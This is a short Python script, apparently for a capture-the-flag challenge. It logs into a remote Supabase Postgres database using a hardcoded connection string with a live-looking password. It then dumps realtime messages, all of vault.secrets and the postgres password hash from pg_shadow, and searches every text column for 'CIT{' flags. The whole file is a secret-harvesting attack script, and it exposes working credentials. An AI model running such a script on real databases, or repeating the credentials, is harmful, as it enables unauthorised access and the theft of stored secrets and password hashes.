import psycopg2
DSN = "postgresql://postgres.ljvmdzjbrmodpmheugie:C7JjqMazeea49LQw@aws-1-us-west-1.pooler.supabase.com:6543/postgres"
conn = psycopg2.connect(DSN, connect_timeout=10)
cur = conn.cursor()
# realtime, net, extensions, and vault
for q,label in [
    ("SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema IN ('realtime','net','extensions','vault') ORDER BY 1,2", "tables"),
    ("SELECT COUNT(*) FROM realtime.messages", "realtime.messages count"),
    ("SELECT * FROM realtime.messages LIMIT 30", "realtime.messages"),
    ("SELECT * FROM realtime.subscription LIMIT 10", "subs"),
    ("SELECT name, schemaname, tablename FROM pg_publication p JOIN pg_publication_tables pt ON p.pubname=pt.pubname LIMIT 50", "publications"),
    ("SELECT * FROM vault.secrets", "vault.secrets (all cols)"),
    ("SELECT usename, passwd FROM pg_shadow WHERE usename='postgres'", "shadow"),
    ("SELECT DISTINCT current_user, session_user", "whoami"),
    ("SELECT version()", "ver"),
    ("SELECT datname FROM pg_database", "dbs"),
    # search CIT across ALL text columns of ALL schemas
]:
    print(f"\n=== {label} ===")
    try:
        cur.execute(q)
        cols=[d.name for d in cur.description] if cur.description else []
        if cols: print(" | ".join(cols))
        for r in cur.fetchall():
            print(" ", r)
    except Exception as e:
        print("  err:", e)

# global CIT hunt
print("\n=== global CIT hunt ===")
cur.execute("""SELECT table_schema, table_name, column_name FROM information_schema.columns
               WHERE data_type IN ('text','character varying','json','jsonb','name','char','character')""")
cols=cur.fetchall()
for s,t,c in cols:
    if s.startswith('pg_'): continue
    try:
        cur.execute(f'SELECT "{c}" FROM "{s}"."{t}" WHERE "{c}"::text ~ \'CIT\\{{\' LIMIT 5')
        rows=cur.fetchall()
        if rows:
            for (v,) in rows: print(f"HIT {s}.{t}.{c}: {v}")
    except Exception: pass
cur.close(); conn.close()
